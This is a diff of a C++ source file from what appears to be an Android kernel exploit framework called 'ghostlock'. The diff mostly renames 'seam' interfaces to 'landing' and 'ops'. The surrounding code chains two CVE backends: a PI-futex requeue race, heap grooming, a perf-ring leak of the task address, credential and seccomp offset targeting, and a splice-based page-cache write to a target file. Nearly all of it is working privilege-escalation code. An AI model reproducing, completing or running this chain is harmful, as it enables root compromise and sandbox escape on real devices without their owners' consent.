@@ -7,24 +7,24 @@
 #include <unistd.h>
 
 #include "backend/cve_2026_43284/access_params.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
-#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
+#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
 #include "backend/cve_2026_43284/session_frame.hpp"
 #include "backend/cve_2026_43499/abi.hpp"
 #include "backend/cve_2026_43499/leak/collision_buckets.hpp"
 #include "backend/cve_2026_43499/leak/snitch_region.hpp"
-/* The device seam's header includes linux/futex.h and this file is compiled for the host as well,
- *  because main.cpp calls it from both. The one step that needs the seam is guarded by platform, not
+/* The device landing's header includes linux/futex.h and this file is compiled for the host as well,
+ *  because main.cpp calls it from both. The one step that needs the landing is guarded by platform, not
  *  by a switch: there is no build of this file where a host can map shared memory through it. */
 #ifdef __ANDROID__
-#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
-#include "backend/cve_2026_43499/race/futex_seam_linux.hpp"
+#include "backend/cve_2026_43499/memory/heap_ops_linux.hpp"
+#include "backend/cve_2026_43499/race/futex_ops_linux.hpp"
 #include "backend/cve_2026_43499/perf_ring.hpp"
-#include "backend/cve_2026_43499/perf_seam.hpp"
-#include "backend/cve_2026_43499/perf_seam_linux.hpp"
+#include "backend/cve_2026_43499/perf_ops.hpp"
+#include "backend/cve_2026_43499/perf_ops_linux.hpp"
 #include "backend/cve_2026_43499/memory/multicast_arm.hpp"
 #include "sys/syscall.h"
 #include <pthread.h>
@@ -35,7 +35,7 @@
 #include <cstring>
 
 #include <fcntl.h>
-#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops_linux.hpp"
 #endif
 #include "backend/cve_2026_43499/leak/snitch_owner.hpp"
 #include "backend/cve_2026_43499/session.hpp"
@@ -59,78 +59,78 @@ namespace ghostlock::pipeline {
 #ifdef __ANDROID__
 namespace {
     /**
-     *  Both device seams in one, copied from the probe that ran this on the hardware. The search
-     *  requires a seam that is a heap seam and a snitch seam at once, and the two Linux halves each
+     *  Both device ops in one, copied from the probe that ran this on the hardware. The search
+     *  requires a landing that is a heap landing and a snitch landing at once, and the two Linux halves each
      *  answer one of those: this is the composition, not a new mechanism.
      */
-    struct DeviceSeam final {
+    struct DeviceOps final {
         static backend::cve_2026_43499::leak::MapResult map_shared(std::size_t bytes) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(bytes);
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::map_shared(bytes);
         }
-        static backend::cve_2026_43499::leak::SeamResult unmap(void *address, std::size_t bytes) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::unmap(address, bytes);
+        static backend::cve_2026_43499::leak::OpsResult unmap(void *address, std::size_t bytes) noexcept {
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::unmap(address, bytes);
         }
-        static backend::cve_2026_43499::leak::SeamResult futex_wait_private(std::uint32_t *word,
+        static backend::cve_2026_43499::leak::OpsResult futex_wait_private(std::uint32_t *word,
                                                                             std::uint32_t expected) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wait_private(word, expected);
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::futex_wait_private(word, expected);
         }
-        static backend::cve_2026_43499::leak::SeamResult futex_wait_private_until(
+        static backend::cve_2026_43499::leak::OpsResult futex_wait_private_until(
             std::uint32_t *word, std::uint32_t expected, std::int64_t timeout_us) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wait_private_until(word, expected,
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::futex_wait_private_until(word, expected,
                                                                                             timeout_us);
         }
-        static backend::cve_2026_43499::leak::SeamResult futex_wake_private(std::uint32_t *word,
+        static backend::cve_2026_43499::leak::OpsResult futex_wake_private(std::uint32_t *word,
                                                                            std::int32_t waiters) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wake_private(word, waiters);
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::futex_wake_private(word, waiters);
         }
         static backend::cve_2026_43499::leak::ThreadResult start_thread(
             backend::cve_2026_43499::leak::ThreadEntry entry, void *argument) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::start_thread(entry, argument);
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::start_thread(entry, argument);
         }
-        static backend::cve_2026_43499::leak::SeamResult join_thread(unsigned long handle) noexcept {
-            return backend::cve_2026_43499::leak::LinuxSnitchSeam::join_thread(handle);
+        static backend::cve_2026_43499::leak::OpsResult join_thread(unsigned long handle) noexcept {
+            return backend::cve_2026_43499::leak::LinuxSnitchOps::join_thread(handle);
         }
-        static backend::cve_2026_43499::memory::SeamResult page_size() noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::page_size();
+        static backend::cve_2026_43499::memory::OpsResult page_size() noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::page_size();
         }
-        static backend::cve_2026_43499::memory::SeamResult open_memfd(std::uint64_t pid) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::open_memfd(pid);
+        static backend::cve_2026_43499::memory::OpsResult open_memfd(std::uint64_t pid) noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::open_memfd(pid);
         }
-        static backend::cve_2026_43499::memory::SeamResult close_fd(std::int32_t fd) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
+        static backend::cve_2026_43499::memory::OpsResult close_fd(std::int32_t fd) noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::close_fd(fd);
         }
-        static backend::cve_2026_43499::memory::SeamResult socket_pair(std::int32_t *out) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::socket_pair(out);
+        static backend::cve_2026_43499::memory::OpsResult socket_pair(std::int32_t *out) noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::socket_pair(out);
         }
-        static backend::cve_2026_43499::memory::SeamResult set_socket_buffer(std::int32_t fd,
+        static backend::cve_2026_43499::memory::OpsResult set_socket_buffer(std::int32_t fd,
                                                                             std::int32_t bytes) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::set_socket_buffer(fd, bytes);
+            return backend::cve_2026_43499::memory::LinuxHeapOps::set_socket_buffer(fd, bytes);
         }
-        static backend::cve_2026_43499::memory::SeamResult set_nonblocking(std::int32_t fd) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::set_nonblocking(fd);
+        static backend::cve_2026_43499::memory::OpsResult set_nonblocking(std::int32_t fd) noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::set_nonblocking(fd);
         }
-        static backend::cve_2026_43499::memory::SeamResult send_bytes(std::int32_t fd, const void *data,
+        static backend::cve_2026_43499::memory::OpsResult send_bytes(std::int32_t fd, const void *data,
                                                                     std::size_t bytes) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::send_bytes(fd, data, bytes);
+            return backend::cve_2026_43499::memory::LinuxHeapOps::send_bytes(fd, data, bytes);
         }
 
-        static backend::cve_2026_43499::memory::SeamResult send_buffer(std::int32_t fd,
+        static backend::cve_2026_43499::memory::OpsResult send_buffer(std::int32_t fd,
                                                                       std::size_t bytes) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::send_buffer(fd, bytes);
+            return backend::cve_2026_43499::memory::LinuxHeapOps::send_buffer(fd, bytes);
         }
-        static backend::cve_2026_43499::memory::SeamResult fork_child() noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::fork_child();
+        static backend::cve_2026_43499::memory::OpsResult fork_child() noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::fork_child();
         }
-        static backend::cve_2026_43499::memory::SeamResult stop_child(std::uint64_t pid) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::stop_child(pid);
+        static backend::cve_2026_43499::memory::OpsResult stop_child(std::uint64_t pid) noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::stop_child(pid);
         }
-        static backend::cve_2026_43499::memory::SeamResult yield_now() noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::yield_now();
+        static backend::cve_2026_43499::memory::OpsResult yield_now() noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::yield_now();
         }
-        static backend::cve_2026_43499::memory::SeamResult pin_to_processor(std::int32_t cpu) noexcept {
-            return backend::cve_2026_43499::memory::LinuxHeapSeam::pin_to_processor(cpu);
+        static backend::cve_2026_43499::memory::OpsResult pin_to_processor(std::int32_t cpu) noexcept {
+            return backend::cve_2026_43499::memory::LinuxHeapOps::pin_to_processor(cpu);
         }
-        static void exit_child() noexcept { backend::cve_2026_43499::memory::LinuxHeapSeam::exit_child(); }
+        static void exit_child() noexcept { backend::cve_2026_43499::memory::LinuxHeapOps::exit_child(); }
     };
 
     /**
@@ -173,18 +173,18 @@ namespace {
             /* The retired waiter does not park until the owner has taken the target lock: the
              *  owner reports it by setting owner_started. */
             while (ctx->owner_started == 0 && ctx->release == 0) { ::sched_yield(); }
-            if (backend::cve_2026_43499::race::LinuxFutexSeam::lock_pi(ctx->chain) != 0) {
+            if (backend::cve_2026_43499::race::LinuxFutexOps::lock_pi(ctx->chain) != 0) {
                 ctx->result = -1;
                 ctx->done = 1;
                 ctx->seen = ctx->arm;
                 continue;
             }
-            const int parked = backend::cve_2026_43499::race::LinuxFutexSeam::wait_requeue_pi(
+            const int parked = backend::cve_2026_43499::race::LinuxFutexOps::wait_requeue_pi(
                 ctx->wait, ctx->target);
             ctx->result = parked;
             if (parked == 0) {
                 ctx->gave_back =
-                    backend::cve_2026_43499::race::LinuxFutexSeam::unlock_pi(ctx->target);
+                    backend::cve_2026_43499::race::LinuxFutexOps::unlock_pi(ctx->target);
             }
             ctx->seen = ctx->arm;
             ctx->done = 1;
@@ -330,14 +330,14 @@ namespace {
 #endif
 
 
-        using backend::cve_2026_43284::seam::PageCacheWindow;
+        using backend::cve_2026_43284::landing::PageCacheWindow;
         using backend::cve_2026_43284::SaMaterial;
-        using backend::cve_2026_43284::seam::PageCacheDoorLinux;
-        using backend::cve_2026_43284::seam::PageCacheDoors;
-        using backend::cve_2026_43284::seam::PageCacheSeam;
-        using backend::cve_2026_43284::seam::PageCacheWrite;
-        using backend::cve_2026_43284::seam::real_splice_io;
-        using backend::cve_2026_43284::seam::RealSpliceIo;
+        using backend::cve_2026_43284::landing::PageCacheDoorLinux;
+        using backend::cve_2026_43284::landing::PageCacheDoors;
+        using backend::cve_2026_43284::landing::PageCacheLanding;
+        using backend::cve_2026_43284::landing::PageCacheWrite;
+        using backend::cve_2026_43284::landing::real_splice_io;
+        using backend::cve_2026_43284::landing::RealSpliceIo;
         using backend::cve_2026_43284::read_session_secret_frame;
         using backend::cve_2026_43284::SessionFrameStatus;
     }  // namespace
@@ -391,7 +391,7 @@ namespace {
         }
         std::printf("run-temp: the gate admitted window.pagecache\n");
 
-        /* 3. The doors, the window and the seam, in the order their own comments prescribe. The
+        /* 3. The doors, the window and the landing, in the order their own comments prescribe. The
          *    carrier is where the page comes from. In the finished path it is chosen by the
          *    selection and carried as a resource; the retired tree read it from resources.carrier.path
          *    and nothing in this tree produces it yet, so this temporary entry takes a development
@@ -411,17 +411,17 @@ namespace {
         }
         RealSpliceIo io(real_splice_io(), target_fd);
         PageCacheWrite window(door, io);
-        PageCacheSeam seam(window);
+        PageCacheLanding landing(window);
 
         /* 4. Up. Without the credentials the doors do not open, and this backend has no route axis,
          *    so the call that matters is the one that takes the whole frame. */
-        if (!seam.bring_up_with(sa)) {
-            std::printf("run-temp: the seam did not come up\n");
+        if (!landing.bring_up_with(sa)) {
+            std::printf("run-temp: the landing did not come up\n");
             static_cast<void>(::close(target_fd));
             return 8;
         }
-        std::printf("run-temp: seam up, target fd open, window bound\n");
-        const bool down = seam.tear_down();
+        std::printf("run-temp: landing up, target fd open, window bound\n");
+        const bool down = landing.tear_down();
         static_cast<void>(::close(target_fd));
         std::printf("run-temp: torn down %s\n", down ? "ok" : "refused");
 
@@ -595,7 +595,7 @@ namespace {
 
 #ifdef __ANDROID__
         const backend::cve_2026_43499::leak::MapResult words_region =
-            backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(4096U);
+            backend::cve_2026_43499::leak::LinuxSnitchOps::map_shared(4096U);
         if (words_region.address == nullptr) {
             std::printf("run-temp: the cohort words could not be mapped (errno %d)\n",
                         words_region.error);
@@ -605,7 +605,7 @@ namespace {
         std::uint32_t *word_ptrs[2] = {reinterpret_cast<std::uint32_t *>(words_base),
                                        reinterpret_cast<std::uint32_t *>(words_base + 64U)};
 #else
-        /* The host has no seam to map the cohort words through, so that step is named and refused
+        /* The host has no landing to map the cohort words through, so that step is named and refused
          *  rather than approximated. Everything before it is the same code on both platforms. */
         std::printf("run-temp: the cohort words need a device; stopping before the search\n");
         return 10;
@@ -680,10 +680,10 @@ namespace {
         stub_buckets.want = address_table[0];
         stub_buckets.second = address_table[1];
 
-        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets> snitch{args, &stub_buckets,
+        backend::cve_2026_43499::leak::SnitchPolicy<DeviceOps, StubBuckets> snitch{args, &stub_buckets,
                                                                                   {}, false};
         const backend::cve_2026_43499::memory::PrepareOutcome prepared =
-            backend::cve_2026_43499::memory::prepare_page<DeviceSeam, decltype(snitch)>(
+            backend::cve_2026_43499::memory::prepare_page<DeviceOps, decltype(snitch)>(
                 prepare_inputs, geometry, waiting, snitch);
         std::printf("run-temp: prepare %s at=%d opened=%zu closed=%zu base=0x%lx\n",
                     backend::cve_2026_43499::memory::prepare_status_name(prepared.status),
@@ -738,7 +738,7 @@ namespace {
          *  credential come from the profile offsets through the platform geometry, and the seccomp
          *  field is thread_info.flags at the process own task, which is why it needs the task
          *  and the other two do not. */
-        /* 12d. The task address, taken the way the perf seam probe takes it: software CPU clock,
+        /* 12d. The task address, taken the way the perf landing probe takes it: software CPU clock,
          *      samples carrying the interrupted register set with a thirty-two bit mask, the ring
          *      walked and the register words voted on. The window is the measured one. The retired
          *      rule holds: a real leak reproduces, so three samples are taken and any two that agree
@@ -772,15 +772,15 @@ namespace {
             perf_args.exclude_user = false;
             perf_args.exclude_hv = true;
             perf_args.exclude_idle = true;
-            const auto opened = backend::cve_2026_43499::LinuxPerfSeam::perf_open(perf_args);
+            const auto opened = backend::cve_2026_43499::LinuxPerfOps::perf_open(perf_args);
             if (opened.value < 0) {
                 return 0U;
             }
             const auto fd = static_cast<std::int32_t>(opened.value);
             auto *const base = static_cast<unsigned char *>(
-                backend::cve_2026_43499::LinuxPerfSeam::perf_map(fd, 9U * 4096U));
+                backend::cve_2026_43499::LinuxPerfOps::perf_map(fd, 9U * 4096U));
             if (base == nullptr) {
-                (void) backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
+                (void) backend::cve_2026_43499::memory::LinuxHeapOps::close_fd(fd);
                 return 0U;
             }
             auto page_word = [&](std::size_t at) -> std::uint64_t {
@@ -792,12 +792,12 @@ namespace {
             };
             const std::uint64_t data_offset = page_word(backend::cve_2026_43499::kPerfDataOffsetOffset);
             const std::uint64_t data_size = page_word(backend::cve_2026_43499::kPerfDataSizeOffset);
-            (void) backend::cve_2026_43499::LinuxPerfSeam::perf_ioctl(
+            (void) backend::cve_2026_43499::LinuxPerfOps::perf_ioctl(
                 fd, backend::cve_2026_43499::kPerfEventIocEnable);
             for (std::size_t i = 0U; i < kSpinRounds; ++i) {
-                (void) backend::cve_2026_43499::LinuxPerfSeam::spin_once();
+                (void) backend::cve_2026_43499::LinuxPerfOps::spin_once();
             }
-            (void) backend::cve_2026_43499::LinuxPerfSeam::perf_ioctl(
+            (void) backend::cve_2026_43499::LinuxPerfOps::perf_ioctl(
                 fd, backend::cve_2026_43499::kPerfEventIocDisable);
             const std::uint64_t head = page_word(backend::cve_2026_43499::kPerfDataHeadOffset);
             backend::cve_2026_43499::RingView ring{};
@@ -808,9 +808,9 @@ namespace {
             std::uint64_t candidates[backend::cve_2026_43499::kCandidateCapacity] = {};
             const auto outcome = backend::cve_2026_43499::walk_perf_ring(
                 ring, measured_bounds, candidates, backend::cve_2026_43499::kCandidateCapacity);
-            (void) backend::cve_2026_43499::LinuxPerfSeam::perf_ioctl(
+            (void) backend::cve_2026_43499::LinuxPerfOps::perf_ioctl(
                 fd, backend::cve_2026_43499::kPerfEventIocDisable);
-            (void) backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
+            (void) backend::cve_2026_43499::memory::LinuxHeapOps::close_fd(fd);
             const std::uint64_t winner =
                 backend::cve_2026_43499::vote_for_task(candidates, outcome.kept);
             votes = 0U;
@@ -879,7 +879,7 @@ namespace {
          *  does not land. TEMPORARY: the size and the base offset are declared here. */
         std::uint8_t fragment[256] = {};
         fragment[offsets.waiter_w0_offset] = 1U;
-        backend::cve_2026_43499::race::PiRace<backend::cve_2026_43499::race::LinuxFutexSeam> race;
+        backend::cve_2026_43499::race::PiRace<backend::cve_2026_43499::race::LinuxFutexOps> race;
         backend::cve_2026_43499::race::WindowGuard race_window;
         /* The values the layout chooses between, from the retired tree's own formula: the payload
          *  base is the prepared page minus the delta, the two file-operation tables sit at their
@@ -900,7 +900,7 @@ namespace {
                     static_cast<unsigned long>(layout_inputs.credential_fops),
                     static_cast<unsigned long>(layout_inputs.credential_value));
         (void) std::putchar(10);
-        backend::cve_2026_43499::steps::RaceAction<backend::cve_2026_43499::race::LinuxFutexSeam>
+        backend::cve_2026_43499::steps::RaceAction<backend::cve_2026_43499::race::LinuxFutexOps>
             action{race, race_window, waiter_offsets, step_targets, fragment, sizeof(fragment), 8U, 0U,
                    &step_wait_word, &step_target_word, layout_inputs};
         /* The retired route repeats: the arm only starts once the earlier copies have overwritten
@@ -1110,7 +1110,7 @@ namespace {
         (void) std::putchar(10);
         return executed.ok ? 0 : 19;
 #else
-        /* The discovery runs the search, which needs the device seam and the words the */
+        /* The discovery runs the search, which needs the device landing and the words the */
         /* cohort hammers; the host has neither, so this step is named and refused. */
         std::printf("run-temp: the discovery needs a device; stopping before it\n");
         return 13;
